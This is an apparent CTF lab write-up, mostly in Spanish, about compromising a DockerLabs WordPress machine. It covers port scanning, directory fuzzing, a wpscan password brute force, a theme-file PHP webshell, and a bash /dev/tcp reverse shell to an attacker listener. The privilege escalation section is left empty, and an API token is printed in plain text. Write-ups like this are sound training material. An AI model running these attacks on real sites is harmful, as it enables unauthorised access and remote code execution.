---
os: Linux
tags:
  - "#ctfs"
  - "#wordpress"
  - "#dockerlabs"
  - "#fuzzing"
platform: Docker Labs
---
## Herramientas Utilizadas

- nmap
- wfuzz
- wpscan


---

## Reconocimiento

Scanned all TCP ports:

```bash
❯ nmap --top-ports 200 -T5 -sCV 172.17.0.2 -n -Pn
```

Enumerated open TCP ports:

```bash
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.57 (Debian)

```


---

## Enumeración

##### Port 80 - HTTP (Apache)


El puerto muestra un login con apache y nada de informacion relevante:
![](../assets/Pasted image 20251027002907.png)


Procedemos a aplicar fuzzing

- Encontramos que corre un tiene una ruta wordpress
```bash
> wfuzz -c -t 200 --hc=403,404 -z file,/home/kali/Desktop/dictionaries/SecLists/Discovery/Web-Content/raft-medium-directories.txt http://172.17.0.2/FUZZ/
> 
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                   
=====================================================================

000000327:   200        277 L    1573 W     53178 Ch    "wordpress" 
```

![](../assets/Pasted image 20251027003044.png)


Enumeramos el WordPress con la herramienta `wpscan` para encontrar posibles plugins vulnerables y usuarios:

```bash
❯ wpscan --url http://172.17.0.2/wordpress -e vp,u --api-token="uq8982s3ErR8RGRi7NFmxp9RA9wsuFCbgU9bXBxiLnU"
------------------------------------------------------------------------------------------------------------
[i] User(s) Identified:

[+] mario
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://172.17.0.2/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)

```


Identificamos un usuario llamado _mario_ y con la misma herramienta de `wpscan` procedemos a aplicar un ataque de fuerza bruta para intentar acceder al panel admin:

```bash
❯ wpscan --url http://172.17.0.2/wordpress -U mario -P /usr/share/wordlists/rockyou.txt

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - mario / love                                                                                                                                                                                                                   
Trying mario / badboy Time: 00:00:08 <                                                                                                                                                             > (390 / 14344782)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: mario, Password: love

```


## Explotación

Accedemos al panel de administración de wordpress con las credenciales: `mario` y `love`

![](../assets/Pasted image 20251027003608.png)

Para acceder al sistema host nos fuimos a la parte de `Themes`
- Editamos el archivo con ese codigo con el respectivo codigo `php` para obtener una webshell
![](../assets/Pasted image 20251027005832.png)

Nos dirigimos a la ruta donde se alojan los temas para probar nuestra web shell:
`> http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/index.php?cmd=whoami`

![](../assets/Pasted image 20251027010505.png)

Ahora nos intentamos mandar una reverse shell

Nos ponemos en escucha con netcat por el puerto 443
`nc -nlvp 443`

Y desde nuestra web shell nos mandamos una bash
`> http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/index.php?cmd=bash -c "bash -i >%26 /dev/tcp/192.168.220.129/443 0>%261"`

```bash
❯ nc -lvp 443

listening on [any] 443 ...
whoami
172.17.0.2: inverse host lookup failed: Unknown host
connect to [192.168.220.129] from (UNKNOWN) [172.17.0.2] 44818
bash: cannot set terminal process group (265): Inappropriate ioctl for device
bash: no job control in this shell
</html/wordpress/wp-content/themes/twentytwentytwo$ whoami
www-data
</html/wordpress/wp-content/themes/twentytwentytwo$ 

```

## Escalada de Privilegios


---

